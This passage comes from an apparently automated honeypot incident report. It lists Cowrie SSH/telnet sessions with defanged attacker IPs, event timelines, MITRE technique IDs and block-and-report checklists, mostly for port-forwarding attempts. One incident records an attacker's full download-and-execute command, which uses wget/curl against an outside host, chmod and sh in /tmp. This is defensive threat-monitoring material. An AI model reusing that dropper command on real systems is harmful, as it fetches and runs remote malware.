- [ ] Submit `60.172.1[.]210` to AbuseIPDB if not already reported
- [ ] Block `60.172.1[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892746a73d48

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:30 |
| **Last Seen** | 2026-08-22 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:30:10` | `cowrie.session.connect` |
| `2026-08-22 03:30:10` | `cowrie.client.version` |
| `2026-08-22 03:30:11` | `cowrie.client.kex` |
| `2026-08-22 03:30:12` | `cowrie.login.success` |
| `2026-08-22 03:30:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:30:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:30:12` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:30:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36a60b5f659

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:30 |
| **Last Seen** | 2026-08-22 03:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:30:14` | `cowrie.session.connect` |
| `2026-08-22 03:30:14` | `cowrie.client.version` |
| `2026-08-22 03:30:14` | `cowrie.client.kex` |
| `2026-08-22 03:30:15` | `cowrie.login.success` |
| `2026-08-22 03:30:15` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:30:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:30:15` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:30:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b72af542fd

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-22 03:34 |
| **Last Seen** | 2026-08-22 03:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:34:22` | `cowrie.session.connect` |
| `2026-08-22 03:34:22` | `cowrie.client.version` |
| `2026-08-22 03:34:22` | `cowrie.client.kex` |
| `2026-08-22 03:34:22` | `cowrie.login.success` |
| `2026-08-22 03:34:23` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:34:23` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7cba62f5986

| Field | Detail |
|---|---|
| **Source IP** | `42.98.224[.]88` |
| **First Seen** | 2026-08-22 03:36 |
| **Last Seen** | 2026-08-22 03:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:36:02` | `cowrie.session.connect` |
| `2026-08-22 03:36:03` | `cowrie.client.version` |
| `2026-08-22 03:36:03` | `cowrie.client.kex` |
| `2026-08-22 03:36:05` | `cowrie.login.success` |
| `2026-08-22 03:36:06` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.98.224[.]88` to AbuseIPDB if not already reported
- [ ] Block `42.98.224[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8379e15ae99a

| Field | Detail |
|---|---|
| **Source IP** | `95.85.224[.]75` |
| **First Seen** | 2026-08-22 03:36 |
| **Last Seen** | 2026-08-22 03:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:36:11` | `cowrie.session.connect` |
| `2026-08-22 03:36:11` | `cowrie.client.version` |
| `2026-08-22 03:36:11` | `cowrie.client.kex` |
| `2026-08-22 03:36:12` | `cowrie.login.success` |
| `2026-08-22 03:36:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:36:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.85.224[.]75` to AbuseIPDB if not already reported
- [ ] Block `95.85.224[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b606453b73c4

| Field | Detail |
|---|---|
| **Source IP** | `182.93.95[.]214` |
| **First Seen** | 2026-08-22 03:38 |
| **Last Seen** | 2026-08-22 03:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:38:12` | `cowrie.session.connect` |
| `2026-08-22 03:38:12` | `cowrie.client.version` |
| `2026-08-22 03:38:12` | `cowrie.client.kex` |
| `2026-08-22 03:38:14` | `cowrie.login.success` |
| `2026-08-22 03:38:15` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:38:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.95[.]214` to AbuseIPDB if not already reported
- [ ] Block `182.93.95[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c94db4c5ef3

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-22 03:38 |
| **Last Seen** | 2026-08-22 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:38:21` | `cowrie.session.connect` |
| `2026-08-22 03:38:21` | `cowrie.client.version` |
| `2026-08-22 03:38:21` | `cowrie.client.kex` |
| `2026-08-22 03:38:22` | `cowrie.login.success` |
| `2026-08-22 03:38:23` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6ce936e8572

| Field | Detail |
|---|---|
| **Source IP** | `194.59.245[.]3` |
| **First Seen** | 2026-08-22 03:38 |
| **Last Seen** | 2026-08-22 03:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:38:24` | `cowrie.session.connect` |
| `2026-08-22 03:38:24` | `cowrie.client.version` |
| `2026-08-22 03:38:24` | `cowrie.client.kex` |
| `2026-08-22 03:38:25` | `cowrie.login.success` |
| `2026-08-22 03:38:25` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:38:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.59.245[.]3` to AbuseIPDB if not already reported
- [ ] Block `194.59.245[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da77cd770d34

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]82` |
| **First Seen** | 2026-08-22 03:38 |
| **Last Seen** | 2026-08-22 03:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:38:31` | `cowrie.session.connect` |
| `2026-08-22 03:38:31` | `cowrie.client.version` |
| `2026-08-22 03:38:31` | `cowrie.client.kex` |
| `2026-08-22 03:38:34` | `cowrie.login.success` |
| `2026-08-22 03:38:35` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42850c5f2de7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:39 |
| **Last Seen** | 2026-08-22 03:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:39:55` | `cowrie.session.connect` |
| `2026-08-22 03:39:55` | `cowrie.client.version` |
| `2026-08-22 03:39:55` | `cowrie.client.kex` |
| `2026-08-22 03:39:56` | `cowrie.login.success` |
| `2026-08-22 03:39:56` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:39:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:39:56` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7badb92896bf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:39 |
| **Last Seen** | 2026-08-22 03:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:39:59` | `cowrie.session.connect` |
| `2026-08-22 03:39:59` | `cowrie.client.version` |
| `2026-08-22 03:39:59` | `cowrie.client.kex` |
| `2026-08-22 03:40:00` | `cowrie.login.success` |
| `2026-08-22 03:40:00` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:40:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:40:00` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:40:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4897d2df0c71

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-22 03:44 |
| **Last Seen** | 2026-08-22 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:44:55` | `cowrie.session.connect` |
| `2026-08-22 03:44:55` | `cowrie.telnet.option` |
| `2026-08-22 03:44:55` | `cowrie.login.success` |
| `2026-08-22 03:44:55` | `cowrie.session.params` |
| `2026-08-22 03:44:55` | `cowrie.telnet.option` |
| `2026-08-22 03:44:55` | `cowrie.telnet.option` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.failed` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.success` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.failed` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.success` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.failed` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.success` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.command.failed` |
| `2026-08-22 03:44:55` | `cowrie.command.input` |
| `2026-08-22 03:44:55` | `cowrie.log.closed` |
| `2026-08-22 03:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b5f3f511da

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-08-22 03:46 |
| **Last Seen** | 2026-08-22 03:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:46:43` | `cowrie.session.connect` |
| `2026-08-22 03:46:43` | `cowrie.client.version` |
| `2026-08-22 03:46:43` | `cowrie.client.kex` |
| `2026-08-22 03:46:45` | `cowrie.login.success` |
| `2026-08-22 03:46:46` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82abad68212d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.33[.]67` |
| **First Seen** | 2026-08-22 03:46 |
| **Last Seen** | 2026-08-22 03:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:46:56` | `cowrie.session.connect` |
| `2026-08-22 03:46:56` | `cowrie.client.version` |
| `2026-08-22 03:46:56` | `cowrie.client.kex` |
| `2026-08-22 03:46:57` | `cowrie.login.success` |
| `2026-08-22 03:46:57` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.33[.]67` to AbuseIPDB if not already reported
- [ ] Block `217.60.33[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f246be3567e9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:49 |
| **Last Seen** | 2026-08-22 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:49:48` | `cowrie.session.connect` |
| `2026-08-22 03:49:48` | `cowrie.client.version` |
| `2026-08-22 03:49:49` | `cowrie.client.kex` |
| `2026-08-22 03:49:49` | `cowrie.login.success` |
| `2026-08-22 03:49:50` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:49:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:49:50` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f42a863971c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:49 |
| **Last Seen** | 2026-08-22 03:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:49:53` | `cowrie.session.connect` |
| `2026-08-22 03:49:53` | `cowrie.client.version` |
| `2026-08-22 03:49:53` | `cowrie.client.kex` |
| `2026-08-22 03:49:54` | `cowrie.login.success` |
| `2026-08-22 03:49:54` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:49:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:49:54` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:49:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0197e1e6f3d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:59 |
| **Last Seen** | 2026-08-22 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:59:41` | `cowrie.session.connect` |
| `2026-08-22 03:59:41` | `cowrie.client.version` |
| `2026-08-22 03:59:41` | `cowrie.client.kex` |
| `2026-08-22 03:59:42` | `cowrie.login.success` |
| `2026-08-22 03:59:42` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:59:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:59:42` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205696b92191

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 03:59 |
| **Last Seen** | 2026-08-22 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 03:59:44` | `cowrie.session.connect` |
| `2026-08-22 03:59:44` | `cowrie.client.version` |
| `2026-08-22 03:59:45` | `cowrie.client.kex` |
| `2026-08-22 03:59:45` | `cowrie.login.success` |
| `2026-08-22 03:59:46` | `cowrie.direct-tcpip.request` |
| `2026-08-22 03:59:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 03:59:46` | `cowrie.direct-tcpip.data` |
| `2026-08-22 03:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d9a0f23b71

| Field | Detail |
|---|---|
| **Source IP** | `106.153.181[.]80` |
| **First Seen** | 2026-08-22 04:02 |
| **Last Seen** | 2026-08-22 04:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:02:08` | `cowrie.session.connect` |
| `2026-08-22 04:02:09` | `cowrie.client.version` |
| `2026-08-22 04:02:09` | `cowrie.client.kex` |
| `2026-08-22 04:02:11` | `cowrie.login.success` |
| `2026-08-22 04:02:12` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.153.181[.]80` to AbuseIPDB if not already reported
- [ ] Block `106.153.181[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3fb4afec06

| Field | Detail |
|---|---|
| **Source IP** | `110.227.215[.]90` |
| **First Seen** | 2026-08-22 04:02 |
| **Last Seen** | 2026-08-22 04:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:02:17` | `cowrie.session.connect` |
| `2026-08-22 04:02:18` | `cowrie.client.version` |
| `2026-08-22 04:02:18` | `cowrie.client.kex` |
| `2026-08-22 04:02:19` | `cowrie.login.success` |
| `2026-08-22 04:02:20` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.215[.]90` to AbuseIPDB if not already reported
- [ ] Block `110.227.215[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a29665a3782

| Field | Detail |
|---|---|
| **Source IP** | `200.139.93[.]67` |
| **First Seen** | 2026-08-22 04:03 |
| **Last Seen** | 2026-08-22 04:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:03:43` | `cowrie.session.connect` |
| `2026-08-22 04:03:43` | `cowrie.client.version` |
| `2026-08-22 04:03:43` | `cowrie.client.kex` |
| `2026-08-22 04:03:45` | `cowrie.login.success` |
| `2026-08-22 04:03:46` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.139.93[.]67` to AbuseIPDB if not already reported
- [ ] Block `200.139.93[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-435e98ffc069

| Field | Detail |
|---|---|
| **Source IP** | `58.215.243[.]6` |
| **First Seen** | 2026-08-22 04:03 |
| **Last Seen** | 2026-08-22 04:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:03:51` | `cowrie.session.connect` |
| `2026-08-22 04:03:52` | `cowrie.client.version` |
| `2026-08-22 04:03:52` | `cowrie.client.kex` |
| `2026-08-22 04:03:54` | `cowrie.login.success` |
| `2026-08-22 04:03:54` | `cowrie.direct-tcpip.request` |
| `2026-08-22 04:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.215.243[.]6` to AbuseIPDB if not already reported
- [ ] Block `58.215.243[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0295d4b8579

| Field | Detail |
|---|---|
| **Source IP** | `65.20.146[.]109` |
| **First Seen** | 2026-08-22 04:08 |
| **Last Seen** | 2026-08-22 04:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 04:08:40` | `cowrie.session.connect` |
